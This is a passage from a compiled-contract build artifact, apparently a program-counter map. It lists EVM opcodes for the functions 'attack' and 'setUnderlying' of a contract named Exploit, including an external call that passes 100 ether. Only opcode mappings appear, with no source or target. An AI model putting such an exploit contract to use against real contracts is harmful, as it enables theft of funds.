      "op": "ISZERO",
      "path": "0"
    },
    "597": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP1",
      "path": "0"
    },
    "598": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "599": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x25F"
    },
    "602": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "603": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "605": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP1",
      "path": "0"
    },
    "606": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "REVERT",
      "path": "0"
    },
    "607": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "608": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "POP",
      "path": "0"
    },
    "609": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "GAS",
      "path": "0"
    },
    "610": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "611": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "612": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP1",
      "path": "0"
    },
    "613": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "614": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x273"
    },
    "617": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "618": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "619": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "621": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP1",
      "path": "0"
    },
    "622": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "623": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "624": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "626": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "REVERT",
      "path": "0"
    },
    "627": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "628": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "POP",
      "path": "0"
    },
    "629": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "POP",
      "path": "0"
    },
    "630": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "POP",
      "path": "0"
    },
    "631": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "POP",
      "path": "0"
    },
    "632": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "634": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "635": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "636": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "638": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "NOT",
      "path": "0"
    },
    "639": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "641": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP3",
      "path": "0"
    },
    "642": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "ADD",
      "path": "0"
    },
    "643": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "AND",
      "path": "0"
    },
    "644": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP3",
      "path": "0"
    },
    "645": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "ADD",
      "path": "0"
    },
    "646": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP1",
      "path": "0"
    },
    "647": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "649": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "650": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "POP",
      "path": "0"
    },
    "651": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "DUP2",
      "path": "0"
    },
    "652": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "ADD",
      "path": "0"
    },
    "653": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "654": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x297"
    },
    "657": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "658": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "659": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x437"
    },
    "662": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        1354,
        1375
      ],
      "op": "JUMP",
      "path": "0"
    },
    "663": {
      "fn": "Exploit.attack",
      "offset": [
        1354,
        1375
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "664": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "666": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "667": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "669": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP7",
      "path": "0"
    },
    "670": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "671": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "SHL",
      "path": "0"
    },
    "672": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "674": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "676": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "678": {
      "op": "SHL"
    },
    "679": {
      "op": "SUB"
    },
    "680": {
      "op": "NOT"
    },
    "681": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "AND",
      "path": "0"
    },
    "682": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP2",
      "path": "0"
    },
    "683": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "684": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "686": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "688": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "690": {
      "op": "SHL"
    },
    "691": {
      "op": "SUB"
    },
    "692": {
      "op": "SWAP5"
    },
    "693": {
      "op": "DUP6"
    },
    "694": {
      "op": "AND"
    },
    "695": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "697": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP3",
      "path": "0"
    },
    "698": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "ADD",
      "path": "0"
    },
    "699": {
      "op": "MSTORE"
    },
    "700": {
      "op": "SWAP3"
    },
    "701": {
      "op": "DUP5"
    },
    "702": {
      "op": "AND"
    },
    "703": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "705": {
      "op": "DUP5"
    },
    "706": {
      "op": "ADD"
    },
    "707": {
      "op": "MSTORE"
    },
    "708": {
      "op": "SWAP3"
    },
    "709": {
      "op": "AND"
    },
    "710": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "712": {
      "op": "DUP3"
    },
    "713": {
      "op": "ADD"
    },
    "714": {
      "op": "MSTORE"
    },
    "715": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "717": {
      "op": "DUP2"
    },
    "718": {
      "op": "ADD"
    },
    "719": {
      "op": "SWAP2"
    },
    "720": {
      "op": "SWAP1"
    },
    "721": {
      "op": "SWAP2"
    },
    "722": {
      "op": "MSTORE"
    },
    "723": {
      "fn": "Exploit.attack",
      "offset": [
        1377,
        1398
      ],
      "op": "PUSH9",
      "path": "0",
      "value": "0x56BC75E2D63100000"
    },
    "733": {
      "op": "PUSH1",
      "value": "0x84"
    },
    "735": {
      "op": "DUP3"
    },
    "736": {
      "op": "ADD"
    },
    "737": {
      "op": "MSTORE"
    },
    "738": {
      "fn": "Exploit.attack",
      "offset": [
        1399,
        1400
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "740": {
      "op": "PUSH1",
      "value": "0xA4"
    },
    "742": {
      "op": "DUP3"
    },
    "743": {
      "op": "ADD"
    },
    "744": {
      "op": "DUP2"
    },
    "745": {
      "op": "SWAP1"
    },
    "746": {
      "op": "MSTORE"
    },
    "747": {
      "op": "PUSH1",
      "value": "0xC4"
    },
    "749": {
      "op": "DUP3"
    },
    "750": {
      "op": "ADD"
    },
    "751": {
      "op": "DUP2"
    },
    "752": {
      "op": "SWAP1"
    },
    "753": {
      "op": "MSTORE"
    },
    "754": {
      "op": "PUSH1",
      "value": "0xE4"
    },
    "756": {
      "op": "DUP3"
    },
    "757": {
      "op": "ADD"
    },
    "758": {
      "op": "MSTORE"
    },
    "759": {
      "fn": "Exploit.attack",
      "offset": [
        1423,
        1425
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x38"
    },
    "761": {
      "op": "PUSH2",
      "value": "0x104"
    },
    "764": {
      "op": "DUP3"
    },
    "765": {
      "op": "ADD"
    },
    "766": {
      "op": "MSTORE"
    },
    "767": {
      "op": "PUSH2",
      "value": "0x124"
    },
    "770": {
      "op": "ADD"
    },
    "771": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "773": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "775": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "776": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP1",
      "path": "0"
    },
    "777": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP4",
      "path": "0"
    },
    "778": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "SUB",
      "path": "0"
    },
    "779": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP2",
      "path": "0"
    },
    "780": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "782": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP8",
      "path": "0"
    },
    "783": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP1",
      "path": "0"
    },
    "784": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "785": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "786": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP1",
      "path": "0"
    },
    "787": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "788": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x31C"
    },
    "791": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "792": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "794": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP1",
      "path": "0"
    },
    "795": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "REVERT",
      "path": "0"
    },
    "796": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "797": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "POP",
      "path": "0"
    },
    "798": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "GAS",
      "path": "0"
    },
    "799": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "CALL",
      "path": "0"
    },
    "800": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "801": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP1",
      "path": "0"
    },
    "802": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "803": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x330"
    },
    "806": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "807": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "808": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "810": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "DUP1",
      "path": "0"
    },
    "811": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "812": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "813": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "815": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "REVERT",
      "path": "0"
    },
    "816": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "817": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "POP",
      "path": "0"
    },
    "818": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "POP",
      "path": "0"
    },
    "819": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "POP",
      "path": "0"
    },
    "820": {
      "fn": "Exploit.attack",
      "offset": [
        1277,
        1426
      ],
      "op": "POP",
      "path": "0"
    },
    "821": {
      "fn": "Exploit.attack",
      "offset": [
        1436,
        1446
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 5,
      "value": "0x33C"
    },
    "824": {
      "fn": "Exploit.attack",
      "offset": [
        1436,
        1444
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xF9"
    },
    "827": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        1436,
        1446
      ],
      "op": "JUMP",
      "path": "0"
    },
    "828": {
      "fn": "Exploit.attack",
      "offset": [
        1436,
        1446
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "829": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "POP",
      "path": "0"
    },
    "830": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "POP",
      "path": "0"
    },
    "831": {
      "fn": "Exploit.attack",
      "offset": [
        1153,
        1453
      ],
      "op": "POP",
      "path": "0"
    },
    "832": {
      "fn": "Exploit.attack",
      "jump": "o",
      "offset": [
        1153,
        1453
      ],
      "op": "JUMP",
      "path": "0"
    },
    "833": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        933,
        1045
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "834": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1008,
        1013
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 6,
      "value": "0x0"
    },
    "836": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1008,
        1013
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "837": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "839": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "841": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "843": {
      "op": "SHL"
    },
    "844": {
      "op": "SUB"
    },
    "845": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1008,
        1013
      ],
      "op": "AND",
      "path": "0"
    },
    "846": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        996,
        1006
      ],
      "op": "CALLER",
      "path": "0"
    },
    "847": {
      "branch": 8,
      "fn": "Exploit.setUnderlying",
      "offset": [
        996,
        1013
      ],
      "op": "EQ",
      "path": "0"
    },
    "848": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        988,
        1014
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x358"
    },
    "851": {
      "branch": 8,
      "fn": "Exploit.setUnderlying",
      "offset": [
        988,
        1014
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "852": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        988,
        1014
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "854": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        988,
        1014
      ],
      "op": "DUP1",
      "path": "0"
    },
    "855": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        988,
        1014
      ],
      "op": "REVERT",
      "path": "0"
    },
    "856": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        988,
        1014
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "857": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1029
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 7,
      "value": "0x1"
    },
    "859": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "DUP1",
      "path": "0"
    },
    "860": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "861": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "863": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "865": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "867": {
      "op": "SHL"
    },
    "868": {
      "op": "SUB"
    },
    "869": {
      "op": "NOT"
    },
    "870": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "AND",
      "path": "0"
    },
    "871": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "873": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "875": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "877": {
      "op": "SHL"
    },
    "878": {
      "op": "SUB"
    },
    "879": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "880": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "881": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "882": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "AND",
      "path": "0"
    },
    "883": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "884": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "885": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "886": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "OR",
      "path": "0"
    },
    "887": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "888": {
      "fn": "Exploit.setUnderlying",
      "offset": [
        1024,
        1038
      ],
      "op": "SSTORE",
      "path": "0"
    },
    "889": {
      "fn": "Exploit.setUnderlying",
      "jump": "o",
      "offset": [
        933,
        1045
      ],
      "op": "JUMP",
      "path": "0"
    },
    "890": {
      "op": "JUMPDEST"
    },
    "891": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "893": {
      "op": "DUP1"
    },
    "894": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "896": {
      "op": "DUP4"
    },
    "897": {
      "op": "DUP6"
    },
    "898": {
      "op": "SUB"
    },
    "899": {
      "op": "SLT"
    },
    "900": {
      "op": "ISZERO"
    },
    "901": {
      "op": "PUSH2",
      "value": "0x38D"
    },
    "904": {
      "op": "JUMPI"
    },
    "905": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "907": {
      "op": "DUP1"
    },
    "908": {
      "op": "REVERT"
    },
    "909": {
      "op": "JUMPDEST"
    },
    "910": {
      "op": "DUP3"
    },
    "911": {
      "op": "CALLDATALOAD"
    },
    "912": {
      "op": "PUSH2",
      "value": "0x398"
    },
    "915": {
      "op": "DUP2"
    },
    "916": {
      "op": "PUSH2",
      "value": "0x480"
    },
    "919": {
      "jump": "i",
      "op": "JUMP"
    },
    "920": {
      "op": "JUMPDEST"
    },
    "921": {
      "op": "SWAP5"
    },
    "922": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "924": {
      "op": "SWAP4"
    },
    "925": {
      "op": "SWAP1"
    },
    "926": {
      "op": "SWAP4"
    },
    "927": {
      "op": "ADD"
    },
    "928": {
      "op": "CALLDATALOAD"
    },
    "929": {
      "op": "SWAP4"
    },
    "930": {
      "op": "POP"
    },
    "931": {
      "op": "POP"
    },
    "932": {
      "op": "POP"
    },
    "933": {
      "jump": "o",
      "op": "JUMP"
    },
    "934": {
      "op": "JUMPDEST"
    },
    "935": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "937": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "939": {
      "op": "DUP3"
    },
    "940": {
      "op": "DUP5"
    },
    "941": {
      "op": "SUB"
    },
    "942": {
      "op": "SLT"
    },
    "943": {
      "op": "ISZERO"
    },
    "944": {
      "op": "PUSH2",
      "value": "0x3B8"
    },
    "947": {
      "op": "JUMPI"
    },
    "948": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "950": {
      "op": "DUP1"
    },
    "951": {
      "op": "REVERT"
    },
    "952": {
      "op": "JUMPDEST"
    },
    "953": {
      "op": "DUP2"
    },
    "954": {
      "op": "MLOAD"
    },
    "955": {
      "op": "DUP1"
    },
    "956": {
      "op": "ISZERO"
    },
    "957": {
      "op": "ISZERO"
    },
    "958": {
      "op": "DUP2"
    },
    "959": {
      "op": "EQ"
    },
    "960": {
      "op": "PUSH2",
      "value": "0x3C8"
    },
    "963": {
      "op": "JUMPI"
    },
    "964": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "966": {
      "op": "DUP1"
    },
    "967": {
      "op": "REVERT"
    },
    "968": {
      "op": "JUMPDEST"
    },
    "969": {
      "op": "SWAP4"
    },
    "970": {
      "op": "SWAP3"
    },
    "971": {
      "op": "POP"
    },
    "972": {
      "op": "POP"
    },
    "973": {
      "op": "POP"
    },
    "974": {
      "jump": "o",
      "op": "JUMP"
    },
    "975": {
      "op": "JUMPDEST"
    },
    "976": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "978": {
      "op": "DUP1"
    },
    "979": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "981": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "983": {
      "op": "DUP5"
    },
    "984": {
      "op": "DUP7"
    },
    "985": {
      "op": "SUB"
    },
    "986": {
      "op": "SLT"
    },
    "987": {
      "op": "ISZERO"
    },
    "988": {
      "op": "PUSH2",
      "value": "0x3E4"
    },
    "991": {
      "op": "JUMPI"
    },
    "992": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "994": {
      "op": "DUP1"
    },
    "995": {
      "op": "REVERT"
    },
    "996": {
      "op": "JUMPDEST"
    },
    "997": {
      "op": "DUP4"
    },
    "998": {
      "op": "CALLDATALOAD"
    },
    "999": {
      "op": "PUSH2",
      "value": "0x3EF"
    },
    "1002": {
      "op": "DUP2"
    },
    "1003": {
      "op": "PUSH2",
      "value": "0x480"
    },
    "1006": {
      "jump": "i",
      "op": "JUMP"
    },
    "1007": {
      "op": "JUMPDEST"
    },
    "1008": {
      "op": "SWAP3"
    },
    "1009": {
      "op": "POP"
    },
    "1010": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1012": {
      "op": "DUP5"
    },
    "1013": {
      "op": "ADD"
    },
    "1014": {
      "op": "CALLDATALOAD"
    },
    "1015": {
      "op": "PUSH2",
      "value": "0x3FF"
    },
    "1018": {
      "op": "DUP2"
    },
    "1019": {
      "op": "PUSH2",
      "value": "0x480"
    },
    "1022": {
      "jump": "i",
      "op": "JUMP"
    },
    "1023": {
      "op": "JUMPDEST"
    },
    "1024": {
      "op": "SWAP2"
    },
    "1025": {
      "op": "POP"
    },
    "1026": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "1028": {
      "op": "DUP5"
    },
    "1029": {
      "op": "ADD"
    },
    "1030": {
      "op": "CALLDATALOAD"
    },
    "1031": {
      "op": "PUSH2",
      "value": "0x40F"
    },
    "1034": {
      "op": "DUP2"
    },
    "1035": {
      "op": "PUSH2",
      "value": "0x480"
    },
    "1038": {
      "jump": "i",
      "op": "JUMP"
    },
    "1039": {
      "op": "JUMPDEST"
    },
    "1040": {
      "op": "DUP1"
    },
    "1041": {
      "op": "SWAP2"
    },
    "1042": {
      "op": "POP"
    },
    "1043": {
      "op": "POP"
    },
    "1044": {
      "op": "SWAP3"
    },
    "1045": {
      "op": "POP"
    },
    "1046": {
      "op": "SWAP3"
    },
    "1047": {
      "op": "POP"
    },
    "1048": {
      "op": "SWAP3"
    },
    "1049": {
      "jump": "o",
      "op": "JUMP"
    },
    "1050": {
      "op": "JUMPDEST"
    },
    "1051": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1053": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1055": {
      "op": "DUP3"
    },
    "1056": {
      "op": "DUP5"
    },
    "1057": {
      "op": "SUB"
    },
    "1058": {
      "op": "SLT"
    },
    "1059": {
      "op": "ISZERO"
    },
    "1060": {
      "op": "PUSH2",
      "value": "0x42C"
    },
    "1063": {
      "op": "JUMPI"
    },
    "1064": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1066": {
      "op": "DUP1"
    },
    "1067": {
      "op": "REVERT"
    },
    "1068": {
      "op": "JUMPDEST"
    },
    "1069": {
      "op": "DUP2"
    },
    "1070": {
      "op": "CALLDATALOAD"
    },
    "1071": {
      "op": "PUSH2",
      "value": "0x3C8"
    },
    "1074": {
      "op": "DUP2"
    },
    "1075": {
      "op": "PUSH2",
      "value": "0x480"
    },
    "1078": {
      "jump": "i",
      "op": "JUMP"
    },
    "1079": {
      "op": "JUMPDEST"
    },
    "1080": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1082": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1084": {
      "op": "DUP3"
    },
    "1085": {
      "op": "DUP5"
    },
    "1086": {
      "op": "SUB"
    },
    "1087": {
      "op": "SLT"
    },
    "1088": {
      "op": "ISZERO"
    },
    "1089": {
      "op": "PUSH2",
      "value": "0x449"
    },
    "1092": {
      "op": "JUMPI"
    },
